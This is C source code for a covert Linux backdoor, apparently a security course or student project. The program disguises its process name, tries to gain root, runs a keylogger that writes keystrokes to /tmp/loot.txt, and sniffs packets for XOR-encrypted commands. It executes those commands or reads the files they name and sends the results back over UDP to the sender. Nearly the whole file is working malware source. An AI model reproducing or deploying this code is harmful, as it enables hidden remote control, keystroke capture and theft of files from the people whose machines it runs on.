
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pcap.h>
#include <sys/prctl.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include "pkt_cap.h"
#include "misc.h"
#define ETHER_IP_UDP_LEN 42
#define ETHER_IP_TCP_LEN 54
#define MAX_SIZE 1024
#define PAYKEY "foobar"
#define PASSKEY "barfoo"
#define BACKDOOR_HEADER_LEN 6
#define PASSLEN 6
#define COMMAND_START "start["
#define COMMAND_END "]end"
#define MASK "hello"

void packet_handler(u_char *, const struct pcap_pkthdr *, const u_char *);
void keyLogThread(char *);
unsigned short in_cksum(unsigned short *, int);
char * xor(char *, char *);

/*
   96 bit (12 bytes) pseudo header needed for tcp header checksum calculation
 */
struct pseudo_header
{
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
};

/*
   Generic checksum calculation function
 */
unsigned short csum(unsigned short *ptr,int nbytes)
{
        register long sum;
        unsigned short oddbyte;
        register short answer;

        sum=0;
        while(nbytes>1) {
                sum+=*ptr++;
                nbytes-=2;
        }
        if(nbytes==1) {
                oddbyte=0;
                *((u_char*)&oddbyte)=*(u_char*)ptr;
                sum+=oddbyte;
        }

        sum = (sum>>16)+(sum & 0xffff);
        sum = sum + (sum>>16);
        answer=(short)~sum;

        return(answer);
}

char * xor(char * a, char * b)
{
        int i, x, y;
        x = strlen(a);
        y = strlen(b);
        for (i = 0; i < x; ++i)
                a[i] ^= b[(i%y)];
        //printf("%s", a);
        return a;
}

int main (int argc,char **argv)
{
        pthread_t thread_id;
        char *nic_dev;
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* nic_descr;
        struct bpf_program fp;    // holds compiled program
        bpf_u_int32 maskp;        // subnet mask
        bpf_u_int32 netp;         // ip
        u_char* args = NULL;
        char filter_string[] = "tcp dst port 53";

        /* mask the process name */
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], MASK);
        prctl(PR_SET_NAME, MASK, 0, 0);

        /* change the UID/GID to 0 (raise privs) */
        setuid(0);
        setgid(0);

        /* start kelogger */
        pthread_create(&thread_id, NULL, keyLogThread, "/dev/input/by-path/platform-i8042-serio-0-event-kbd");
        //pthread_join(thread_id, NULL);


        // find the first NIC that is up and sniff packets from it
        nic_dev =  "lo";
        //nic_dev = pcap_lookupdev(errbuf);

        if (nic_dev == NULL)
        {
                printf("%s\n",errbuf);
                exit(1);
        }

        // Use pcap to get the IP address and subnet mask of the device
        pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);


        // open the device for packet capture & set the device in promiscuous mode
        nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
        if (nic_descr == NULL)
        {
                printf("pcap_open_live(): %s\n",errbuf);
                exit(1);
        }

        // Compile the filter expression
        if (pcap_compile (nic_descr, &fp, filter_string, 0, netp) == -1)
        {
                fprintf(stderr,"Error calling pcap_compile\n");
                exit(1);
        }

        // Load the filter into the capture device
        if (pcap_setfilter (nic_descr, &fp) == -1)
        {
                fprintf(stderr,"Error setting filter\n");
                exit(1);
        }

        // Start the capture session

        pcap_loop (nic_descr, 0, packet_handler, NULL);

        fprintf(stdout,"\nCapture Session Done\n");
        return 0;
}

void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
        char buffer1[MAX_SIZE];
        char message[MAX_SIZE];
        int sockfd, n;
        struct sockaddr_in servaddr;
        FILE *f;
        int len, loop, size_ip;
        char *ptr, *ptr2;
        char decrypt[MAX_SIZE];
        char command[MAX_SIZE];
        const struct pcap_ip *ip;
        const struct pcap_udp *udp;

        /* Step 1: locate the payload portion of the packet */
        ptr = (char *)(packet + ETHER_IP_TCP_LEN);

        ip = (struct pcap_ip *)(packet + SIZE_ETHERNET);
        size_ip = IP_HL(ip) * 4;

        udp = (struct pcap_ip *)(packet + SIZE_ETHERNET + size_ip);
        printf("%d\n", udp->uh_dport);

        if ((pkt_info->caplen - ETHER_IP_UDP_LEN - 14) <= 0)
                return;

        /* Step 2: check payload for backdoor header key */
        // if (0 != memcmp(ptr, BACKDOOR_HEADER_KEY, BACKDOOR_HEADER_LEN))
        //         return;
        //ptr += BACKDOOR_HEADER_LEN;
        len = (pkt_info->caplen - ETHER_IP_UDP_LEN);
        memset(decrypt, 0x0, sizeof(decrypt));
        /* Step 3: decrypt the packet by an XOR pass against contents */
        for (loop = 0; loop < len; loop++)
                decrypt[loop] = ptr[loop] ^ PAYKEY[(loop % PASSLEN)];


        /* Step 4: verify decrypted contents */
        if (!(ptr = strstr(decrypt, COMMAND_START)))
                return;
        ptr += strlen(COMMAND_START);
        if (!(ptr2 = strstr(ptr, COMMAND_END)))
                return;
        /* Step 5: extract the remainder */
        memset(command, 0x0, sizeof(command));
        strncpy(command, ptr, (ptr2 - ptr));

        system("hping2 -c 1 -a localhost -s 1000 -p 1022 -M 17 localhost -S");

        // clear servaddr
        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_addr.s_addr = inet_addr(inet_ntoa(ip->ip_src));
        servaddr.sin_port = htons(6000);
        servaddr.sin_family = AF_INET;

        // create datagram socket
        sockfd = socket(AF_INET, SOCK_DGRAM, 0);

        bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr));

        // connect to server
        connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
        /* Step 6: Execute the command */
        if (strncmp("get", command, 3) == 0)
        {
          char getFile[256];
          strcpy(getFile, command+4);
          f = fopen(getFile, "r");
          while(fread(message, 1, sizeof(getFile), f) != NULL)
          {
            send(sockfd, message, strlen(message), 0);
          }
          pclose(f);

        }
        else if (strncmp("watch", command, 5) == 0)
        {
          //inotify
        }
        else
        {
          system(command);
          f = popen(command, "r");
          while(fread(message, 1, sizeof(command), f) != NULL)
          {
            send(sockfd, message, strlen(message), 0);
          }
          pclose(f);
        }
        // close the descriptor
        close(sockfd);
        sockfd = 0;
        return;
}

void keyLogThread(char *kbd)
{
  int fd;
  FILE *fptr;
  struct input_event ev;

  // Open the keyboard device link
  if ((fd = open (kbd, O_RDONLY)) == -1)
  {
      perror ("Invalid Device Link: ");
      exit (1);
  }

  while (TRUE)
  {
      read (fd, &ev, sizeof(struct input_event));   // read from the buffer

      if (ev.type == EV_KEY && ev.value == 1)
      {
      // Open the file to store the key presses
              fptr = fopen ("/tmp/loot.txt","a+");

              // Process each keyboard event
              ProcessKeys (fptr, ev);
              fclose(fptr);
      }
  }
  return;
}
